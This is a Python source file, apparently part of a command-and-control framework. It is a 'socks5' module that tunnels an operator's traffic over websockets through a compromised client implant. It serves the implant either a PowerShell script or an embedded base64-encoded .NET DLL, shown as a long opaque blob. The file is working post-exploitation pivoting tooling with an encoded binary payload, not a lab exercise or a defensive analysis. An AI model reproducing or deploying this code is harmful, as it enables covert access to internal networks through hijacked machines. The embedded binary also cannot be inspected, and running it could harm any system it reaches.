import base64
import logging
import select
import shlex
import socket
import struct
import time
from queue import Empty, SimpleQueue
from socketserver import ThreadingMixIn, TCPServer, StreamRequestHandler
from threading import Thread
from typing import Optional

from tabulate import tabulate

from modules.base import BaseModule, ClientModuleNotLoaded

logging.basicConfig(level=logging.DEBUG)
SOCKS_VERSION = 5
counter = 0


class ThreadingTCPServer(ThreadingMixIn, TCPServer):
    pass


def recv_response(ws_connection):
    while not ws_connection.recv_queues:
        time.sleep(0.05)
    key = next(iter(ws_connection.recv_queues))
    return {'from': key[1], 'payload': ws_connection.recv_queues[key].get(timeout=0.05)}


class SocksProxy5(StreamRequestHandler):
    username = ''
    password = ''
    client_id = ''
    connect_callback = None
    ports = []

    def handle(self):

        global counter

        try:
            header = self.connection.recv(2)
            version, nmethods = struct.unpack("!BB", header)

            assert version == SOCKS_VERSION
            assert nmethods > 0

            methods = self.get_available_methods(nmethods)

            # accept only USERNAME/PASSWORD auth
            if 2 not in set(methods):
                # close connection
                self.server.close_request(self.request)
                return

            # send welcome message
            self.connection.sendall(struct.pack("!BB", SOCKS_VERSION, 2))

            if not self.verify_credentials():
                return

            # request
            version, cmd, _, address_type = struct.unpack("!BBBB", self.connection.recv(4))
            assert version == SOCKS_VERSION

            if address_type == 1:  # IPv4
                address = socket.inet_ntoa(self.connection.recv(4))
            elif address_type == 3:  # Domain name
                domain_length = self.connection.recv(1)[0]
                address = self.connection.recv(domain_length)
                address = socket.gethostbyname(address)
            port = struct.unpack('!H', self.connection.recv(2))[0]

            if cmd == 1:  # CONNECT
                ws_connection = self.c2_connection_factory.create('master_tunnel_{}-{}'.format(address, port), 'socks5')
                payload = {'service': 'socks5', 'host': address, 'port': int(port)}
                ws_connection.send_action('fast_sendmsg', payload, action_options={'to': self.client_id})
                response = recv_response(ws_connection)
                print('response 1-> {}'.format(response))
                if 'payload' in response and 'result' in response['payload'] and response['payload']['result'] == 'KO':
                    self.server.close_request(self.request)
                    return
                websocket_to = response['from']
                counter += 1
                bind_address = ('0.0.0.0', counter)
            else:
                self.server.close_request(self.request)

            addr = struct.unpack("!I", socket.inet_aton(bind_address[0]))[0]
            port = bind_address[1]
            reply = struct.pack("!BBBBIH", SOCKS_VERSION, 0, 0, 1, addr, port)

            self.connection.sendall(reply)

            if reply[1] == 0 and cmd == 1:
                self.exchange_loop(self.connection, ws_connection, websocket_to, counter)
        except ConnectionResetError:
            pass

    def get_available_methods(self, n):
        methods = []
        for i in range(n):
            methods.append(ord(self.connection.recv(1)))
        return methods

    def verify_credentials(self):
        version = ord(self.connection.recv(1))
        assert version == 1

        username_len = ord(self.connection.recv(1))
        username = self.connection.recv(username_len).decode('utf-8')

        password_len = ord(self.connection.recv(1))
        password = self.connection.recv(password_len).decode('utf-8')

        if username == self.username and password == self.password:
            # success, status = 0
            response = struct.pack("!BB", version, 0)
            self.connection.sendall(response)
            return True

        # failure, status != 0
        response = struct.pack("!BB", version, 0xFF)
        self.connection.sendall(response)
        self.server.close_request(self.request)
        return False

    def generate_failed_reply(self, address_type, error_number):
        return struct.pack("!BBBBIH", SOCKS_VERSION, error_number, 0, address_type, 0, 0)

    def close_remote_connection(self, connection, websocket_to):
        payload = {"action": "kill"}
        connection.send_service(websocket_to, 'socks5', payload)
        connection.stop()
        time.sleep(1)
        exit()

    def exchange_loop(self, client, ws_connection, websocket_to, counter):

        client.settimeout(0.05)

        msg_send_counter = 0
        msg_recv_counter = 0
        msg_recv_order = {}

        while True:

            ready_to_read, ready_to_write, in_error = select.select([client], [client], [], 5)
            data = b''

            if ready_to_read:
                data = client.recv(2048)
                # If we can read but we read 0 bytes... client is disconnected
                if data == b'':
                    self.close_remote_connection(ws_connection, websocket_to)
                    break

            if len(data) > 0:
                payload = {"service": "socks5", "action": "send", "order": msg_send_counter, "content": "{}".format(base64.b64encode(data).decode())}
                ws_connection.send_action("fast_sendmsg", payload, action_options={"to": websocket_to})
                msg_send_counter += 1

            try:
                full_message = recv_response(ws_connection)
                # print('FULL MESSAGE: {}'.format(full_message))
                json_data = full_message['payload']
                content = base64.b64decode(json_data['content'])
                if int(json_data['order']) == msg_recv_counter:
                    msg_recv_counter += 1
                    client.send(content)
                    while msg_recv_counter in msg_recv_order:
                        client.send(msg_recv_order[msg_recv_counter])
                        msg_recv_counter += 1
                else:
                    msg_recv_order[int(json_data['order'])] = content
                if 'message' in json_data and 'Internal server error' in json_data['message']:
                    self.close_remote_connection(ws_connection, websocket_to)
                    break
            except select.error:
                self.close_remote_connection(ws_connection, websocket_to)
                break
            except Empty as e:
                pass
            except TimeoutError as e:
                pass
            except KeyError as e:
                if json_data and 'error' in json_data:
                    if json_data['error'] == 2:
                        exit(0)


class SocksProxy(Thread):

    def __init__(self, c2_connection_factory, client_id, host, port, username, password):
        super().__init__()
        self.socks = SocksProxy5
        self.socks.c2_connection_factory = c2_connection_factory
        self.client_id = client_id
        self.socks.client_id = client_id
        self.host = host
        self.port = port
        self.socks.username = username
        self.username = username
        self.socks.password = password
        self.password = password
        self.tcp_server = None

    def run(self):
        self.exc = None
        try:
            self.tcp_server = ThreadingTCPServer((self.host, self.port), self.socks)
            self.tcp_server.serve_forever()
        except OSError as e:
            print('[!] Cannot create proxy on port {} because it is in use.'.format(self.port))
            self.exc = e

    def join(self, timeout: Optional[float] = ...) -> None:
        super(SocksProxy, self).join()
        if self.exc:
            raise self.exc

    def stop(self):
        if self.tcp_server is not None:
            self.tcp_server.shutdown()


class Module(BaseModule):
    MODULE_NAME = 'socks5'

    CLIENT_TYPE_POWERSHELL = 0
    CLIENT_TYPE_CSHARP = 1

    def __init__(self):
        self.running = False

    @staticmethod
    def get_commands() -> [[str]]:
        return [
            ['socks5_create', '<client> <local_host> <local_port> <username> <password>', 'Creates a proxy socks5 through the client.'],
            ['socks5_list', '', 'Lists the created proxies socks.'],
            ['socks5_remove', '<sock_id>', 'Removes the selected proxy socks (based in number # "socks5_list").'],
            ['socks5_remove_all', '', 'Removes all the proxy socks.'],
        ]

    def get_client_code(self, client_type):
        if client_type == self.CLIENT_TYPE_POWERSHELL:
            with open('modules/windows/socks5.ps', 'r') as file:
                return base64.b64encode(file.read().encode()).decode()
        elif client_type == self.CLIENT_TYPE_CSHARP:
            return 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAM6EV/8AAAAAAAAAAOAAIiALATAAABwAAAAGAAAAAAAADjoAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAYIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAALk5AABPAAAAAEAAADADAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAADYOAAAVAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAFBoAAAAgAAAAHAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAADADAAAAQAAAAAQAAAAeAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAAIgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAADtOQAAAAAAAEgAAAACAAUA/CUAANwSAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAN4CcwwAAAp9BwAABAIoDQAACgIOBX0FAAAEAgN9AQAABAIEfQIAAAQCBX0DAAAEAg4EfQQAAAQqGzAEAMcCAAABAAARcwQAAAYKBgJ9DAAABHIBAABwAnsBAAAEKA4AAAooAQAAK3MQAAAKCwdvEQAACiAADAAAbxIAAAoHfg8AAAQlLRcmfg4AAAT+BggAAAZzEwAACiWADwAABG8UAAAKBwb+BgUAAAZzFQAACm8WAAAKB34QAAAEJS0XJn4OAAAE/gYJAAAGcxcAAAolgBAAAARvGAAACgd+EQAABCUtFyZ+DgAABP4GCgAABnMZAAAKJYARAAAEbxoAAAoHbxsAAAoCcxwAAAp9CAAABAJ7CAAABAJ7AwAABG8dAAAKAnsDAAAEbx4AAAoTBRIFKB8AAApvIAAACiDoAwAAbyEAAAotbHMiAAAKJXJHAABwbyMAAAolclUAAHBvJAAACiVyWwAAcG8lAAAKDHMmAAAKJXJfAABwbycAAAolAnsCAAAEbygAAAolCG8pAAAKAnsFAAAEKAIAACsNcnkAAHAoKwAACgcJbywAAArdWgEAAAICewgAAARvLQAACnMuAAAKfQkAAAQCAnsIAAAEby0AAApzLwAACn0KAAAEcyIAAAolckcAAHBvIwAACiVyiwAAcG8kAAAKJXKRAABwbyUAAAoMcyYAAAolcl8AAHBvJwAACiUCewIAAARvKAAACiUIbykAAAoCewUAAAQoAgAAKw0HCW8sAAAKIAAgAACNKAAAARMEOJkAAAACewoAAAQRBBYRBI5pbzAAAAoTBhEEFhEGKDEAAAoTB3MiAAAKJXJHAABwbyMAAAolcpMAAHBvMgAACiURB28zAAAKJQJ7CwAABHM0AAAKbzUAAAoMcyYAAAolcl8AAHBvJwAACiUCewIAAARvKAAACiUIbykAAAoCewUAAAQoAgAAKw0HCW8sAAAKAgJ7CwAABBdYfQsAAAQCewgAAARvLQAACm82AAAKOlL///8bKDcAAAor4wcsBgdvOAAACtwqAEEcAAACAAAAKAAAAJQCAAC8AgAACgAAAAAAAAByAv4GAgAABnM5AAAKczoAAApvOwAACnKdAABwKh4CKA0AAAoqAAAAEzADANIBAAACAAARBG88AAAKOcYBAAAEbz0AAAoUKAMAACsKBm8/AAAKb0AAAApysQAAcChBAAAKLAEqBm8/AAAKb0AAAApykwAAcChBAAAKOW0BAAAGbz8AAApvQgAACgsCewwAAAR7BgAABAwSAShDAAAKCP4BEgEoRAAACl85DwEAAAJ7DAAABAJ7DAAABHsGAAAEF1h9BgAABAIGbz8AAApvRQAACihGAAAKfQ0AAAQCewwAAAR7CQAABCwbAnsMAAAEewkAAAQCew0AAARvRwAACjiYAAAAcrsAAHAoKwAACjiJAAAAAgJ7DAAABHsHAAAEAnsMAAAEewYAAARvSAAACihGAAAKfQ0AAAQCewwAAAR7CQAABCwYAnsMAAAEewkAAAQCew0AAARvRwAACisKcrsAAHAoKwAACgJ7DAAABHsHAAAEAnsMAAAEewYAAARvSQAACiYCewwAAAQCewwAAAR7BgAABBdYfQYAAAQCewwAAAR7BwAABAJ7DAAABHsGAAAEb0oAAAo6V////yoCewwAAAR7BwAABAZvPwAACm9CAAAKCxIBKB8AAAoGbz8AAApvRQAACm9LAAAKKnLzAABwBm8/AAAKb0AAAAooTAAACigrAAAKKi5zBwAABoAOAAAEKh4CKA0AAAoqLnIlAQBwKCsAAAoqWnJNAQBwBG9NAAAKKEwAAAooKwAACioAAAATMAIANQAAAAMAABEEb04AAAog8QMAADMKcocBAHAoKwAACnIYAgBwBG9OAAAKChIAKE8AAAooTAAACigrAAAKKgAAAEJTSkIBAAEAAAAAAAwAAAB2NC4wLjMwMzE5AAAAAAUAbAAAAPQFAAAjfgAAYAYAAGwHAAAjU3RyaW5ncwAAAADMDQAAcAIAACNVUwA8EAAAEAAAACNHVUlEAAAATBAAAJACAAAjQmxvYgAAAAAAAAACAAABVxUCCAkKAAAA+gEzABYAAAEAAAAtAAAABAAAABEAAAAKAAAADQAAAE8AAAAMAAAAAwAAAAUAAAABAAAACQAAAAIAAAADAAAAAADeAwEAAAAAAAYAzAKSBQYAHgOSBQYAJgJ/BQ8AsgUAAAYAUQKOAwYABQOCBAYArQKCBAYAagKCBAYAhwKCBAYA7AKCBAYAOgKCBAYApAYPBAoAIAHWAw4Axga9BBIAagaUBBYAhADbABoA8gaABgYAQwXEAAYA6QTEAAYASAAPBAYACwKSBQ4A1wW9BAoAfAHWAwYAKQUPBAYAUwAPBA4A9wW9BA4A6AW9BAYA/AUPBAYAygMPBAYARQcPBA4AVQSzBg4AWwSzBh4APgYhBAYA0QMcBgoA4QHWAxIAVwWUBCIAqQEPBBoA7gOABgYA/wPEAAYARAMPBAYAIAcPBCYAGQF9AwYAlgEPBCYAFAd9AwYAsAAPBAAAAAC7AAAAAAABAAEAAQAQALEBsQExAAEAAQADARAAIAAAADEADAAEAAMhEADXAAAAMQAOAAYAAQBQBXoBAQC0BHoBAQA4AX0BAQCTBoEBAQBeBoUBAQAjBYkBAQD9BIwBAQAEApQBAQA2BZgBAQDcBJwBAQAJBYkBBgAGBqABBgBEAaQBNgC3AKgBFgABAKwBFgBlALABFgCRALgBUCAAAAAAhhhyBcABAQCIIAAAAACGABAGBgAGAHgjAAAAAIYAPAOSAAYAlSMAAAAAhhhyBQYABgCgIwAAAACDADYAzAEGAH4lAAAAAJEYeAXTAQgAiiUAAAAAhhhyBQYACACSJQAAAACDAAsA1wEIAJ4lAAAAAIMAbwDeAQoAuCUAAAAAgwCbAOUBDAAAAAEAUAUAAAIAtAQAAAMAOAEAAAQAkwYAAAUAXgYAAAEA9gQAAAIAewMAAAEA9gQAAAIAewMAAAEA9gQAAAIAewMAAAEA9gQAAAIAewMJAHIFAQARAHIFBgAZAHIFCgApAHIFEAAxAHIFEAA5AHIFEABBAHIFEABJAHIFEABRAHIFEABZAHIFEACpAHIFBgAMAHIFBgBhAHIFBgDpAJ0GLwDxAGMHNQBxAHIFQABxAEAERwABATMGTADBAHIFUwBxABYEWQAUAHIFUwBxAHYBZgAcAHIFUwBxAGYFdwAkAHIFUwBxAOoBiABxAKsGBgCJAHIFBgBpADEHkgBpACgHlgAsAEkDpACJAPYAqQARAdAGsQBpAHIFBgBpAFUBEABpAOcGEABpAKUEEAAZAXIFBgAZAXcEEAAZAbAEEAAZATQBtgAhAWcDvAApAdcBywBxAFABEACJAPwD0ACRAHIF1gCZAHIF1gCZAAMB3QBJAbkD5QBpAHcEEABpAAgHEAAsAHIF7QBpAB8F8wAxAYQB/ABRAbcEAAFZAfYBBgBhAXIFUwBRAXIFBQFRARoHBgCxADoH/ACxAM4AkgAhAXEDFwG5ACgBJQFpAGwEkgDpAFcHKgFpABUFlgAsANUGpAAsAFMD/ABpAPwGkgBJAagDMAGRAP4BNgEMAAYEPAEMAGADQwEMAEsHQwEMAEABSQHpAJYGUQHRAGoBkgDZAGEBWwFpAcgDkgAuAAsA7AEuABMA9QEuABsAFAIuACMAHQIuACsAUwIuADMAZAIuADsAcQIuAEMAfgIuAEsAUwIuAFMAUwJjAFsAiQKDAFsAiQIcAAwBVwEVAF8AcACBAJ4ABIAAAAEAAAAAAAAAAAAAAAAAvAEAAAUAAAAAAAAAAAAAAF8ByAEAAAAAAQAAAAAAAAAAAAAAAABiAAAAAAABAAAABAAAAAAAAABoAcwEAAAAAAUAAAAAAAAAAAAAAHEBlAQAAAAABQAAAAAAAAAAAAAAXwFLBgAAAAAFAAAAAAAAAAAAAABfAYAGAAAAAAUAAAAAAAAAAAAAAF8BwQUAAAAABQAAAAAAAAAAAAAAXwGiAQAAAAAFAAAAAAAAAAAAAABfAQgBAAAAAAMAAgAEAAIAHwA8AFUAxQB9ACABAAAAAAA8PjlfXzEyXzAAPGNyZWF0ZVNvY2tzPmJfXzEyXzAAPD5jX19EaXNwbGF5Q2xhc3MxMl8wADxjcmVhdGVTb2Nrcz5iX18xAE51bGxhYmxlYDEARXZlbnRIYW5kbGVyYDEAQzIAPD45X18xMl8yADxjcmVhdGVTb2Nrcz5iX18xMl8yAERpY3Rpb25hcnlgMgA8PjlfXzEyXzMAPGNyZWF0ZVNvY2tzPmJfXzEyXzMAVUludDE2ADw+OQA8TW9kdWxlPgBTeXN0ZW0uSU8AZ2V0X0RhdGEAPD5jAFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljAENvbm5lY3RBc3luYwBSZWFkAFN5c3RlbS5UaHJlYWRpbmcuVGhyZWFkAFBheWxvYWQAZ2V0X3BheWxvYWQAc2V0X3BheWxvYWQAQWRkAGRhdGFFbmNvZGVkAFNlbmQAc2V0X3NlcnZpY2UAZ2V0X0NvZGUAZ2V0X01lc3NhZ2UAYWRkX09uTWVzc2FnZQBnZXRfRGF0YUF2YWlsYWJsZQBJRGlzcG9zYWJsZQBTeXN0ZW0uQ29uc29sZQBCYXNlTW9kdWxlAFNvY2tzTW9kdWxlAFN5c3RlbS5SdW50aW1lAFdyaXRlTGluZQBSZXNwb25zZQBhZGRfT25DbG9zZQBEaXNwb3NlAFdyaXRlAHJlbW90ZQBDb21waWxlckdlbmVyYXRlZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAVGFyZ2V0RnJhbWV3b3JrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlJbmZvcm1hdGlvbmFsVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAEV4ZWN1dGUAQnl0ZQBnZXRfVmFsdWUAZ2V0X0hhc1ZhbHVlAFJlbW92ZQBTZXJpYWxpemUARGVzZXJpYWxpemUAU3lzdGVtLlRocmVhZGluZwBTeXN0ZW0uUnVudGltZS5WZXJzaW9uaW5nAEZyb21CYXNlNjRTdHJpbmcAVG9CYXNlNjRTdHJpbmcAVG9TdHJpbmcAVGFzawBDMi51dGlsAFNvY2tzTW9kdWxlLmRsbABOZXR3b3JrU3RyZWFtAEdldFN0cmVhbQBnZXRfSXRlbQBTeXN0ZW0AYWRkX09uT3BlbgBTeXN0ZW0uU2VjdXJpdHkuQXV0aGVudGljYXRpb24AZ2V0X1NzbENvbmZpZ3VyYXRpb24AQ2xpZW50U3NsQ29uZmlndXJhdGlvbgBnZXRfYWN0aW9uAHNldF9hY3Rpb24AU3lzdGVtLlJlZmxlY3Rpb24AU3lzdGVtLlRleHQuSnNvbgBzZXRfcmVhc29uAHNldF90bwBTbGVlcABXZWJTb2NrZXRTaGFycAB3ZWJzb2NrZXQtc2hhcnAAcmVtb3RlUmVhZGVyAEJpbmFyeVJlYWRlcgBzZW5kZXIAYnVmZmVyT3JkZXIAb3V0cHV0T3JkZXIAZ2V0X29yZGVyAHNldF9vcmRlcgBFdmVudEhhbmRsZXIAcmVtb3RlV3JpdGVyAEJpbmFyeVdyaXRlcgBzZXJ2ZXIASnNvblNlcmlhbGl6ZXIAYWRkX09uRXJyb3IALmN0b3IALmNjdG9yAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAFN5c3RlbS5OZXQuUHJpbWl0aXZlcwBNZXNzYWdlRXZlbnRBcmdzAENsb3NlRXZlbnRBcmdzAEVycm9yRXZlbnRBcmdzADw+NF9fdGhpcwBjcmVhdGVTb2NrcwBTeXN0ZW0uVGhyZWFkaW5nLlRhc2tzAHNldF9FbmFibGVkU3NsUHJvdG9jb2xzAFN5c3RlbS5Db2xsZWN0aW9ucwBKU09OT3B0aW9ucwBKc29uU2VyaWFsaXplck9wdGlvbnMAU3lzdGVtLk5ldC5Tb2NrZXRzAHdzAENvbmNhdABGb3JtYXQAT2JqZWN0AENvbm5lY3QAV2ViU29ja2V0U2hhcnAuTmV0AFdlYlNvY2tldABXYWl0AEdldFZhbHVlT3JEZWZhdWx0AHNldF9yZXN1bHQAVGNwQ2xpZW50AGdldF9jb250ZW50AHNldF9jb250ZW50AFRocmVhZFN0YXJ0AENvbnZlcnQAZ2V0X3BvcnQAZ2V0X2hvc3QAZ2V0X0lzVGV4dABBcnJheQBDb250YWluc0tleQBvcF9FcXVhbGl0eQBFbXB0eQAAAAAARXsAMAB9AD8AbgBhAG0AZQA9AFQAdQBuAG4AZQBsAE4ARQBUACYAdQBzAGUAcgBUAHkAcABlAD0AdAB1AG4AbgBlAGwAAA1zAG8AYwBrAHMANQAABUsATwAAA0YAABlmAGEAcwB0AF8AcwBlAG4AZABtAHMAZwAAEUsATwAgAHMAbwBjAGsAcwAABU8ASwAAAQAJcwBlAG4AZAAAE08ASwAuACAAUwBvAGMAawBzAAAJawBpAGwAbAAAN1MATwBDAEsAUwAsACAAcgBlAG0AbwB0AGUAVwByAGkAdABlAHIAIABuAHUAbABvAC4AIABGAAAxUwBvAGMAawBzACwAIABOAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAA6ACAAACdXAGUAYgBzAG8AYwBrAGUAdAAgAGMAbwBuAG4AZQBjAHQAZQBkAAA5RQByAHIAbwByACAAZABlACAAdwBlAGIAcwBvAGMAawBlAHQAcwAuACAARQByAHIAbwByADoAIAAAgI9TAGUAIABoAGEAIAB0AHIAYQB0AGEAZABvACAAZABlACAAZQBuAHYAaQBhAHIAIAB1AG4AIABtAGUAbgBzAGEAagBlACAAZABlAG0AYQBzAGkAYQBkAG8AIABsAGEAcgBnAG8AIAB5ACAAbABhAG0AYgBkAGEAIABoAGEAIABkAHIAbwBwAGUAYQBkAG8AAFdTAE8AQwBLAFMAOgAgAEMAbwBuAGUAeABpAG8AbgAgAHcAZQBiAHMAbwBjAGsAZQB0ACAAYwBlAHIAcgBhAGQAYQAuACAATQBvAHQAaQB2AG8AOgAgAAD9kLlnnWuhSojepWcaSWgGAAQgAQEIAyAAAQUgAQEREQQgAQEOBhUSQQIIDhIHCBIMEjkSNQ4dBRURUQEICA4FAAIODhwGEAEAHR4AAwoBDgYgAgEOHQ4EIAASfQYgAQERgIUF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'

    def run(self, command):
        command_parsed = shlex.split(command)

        if len(command_parsed) > 0:
            if command_parsed[0].lower() == 'socks5_create':
                self.create_socks(command_parsed)
            elif command_parsed[0].lower() == 'socks5_list':
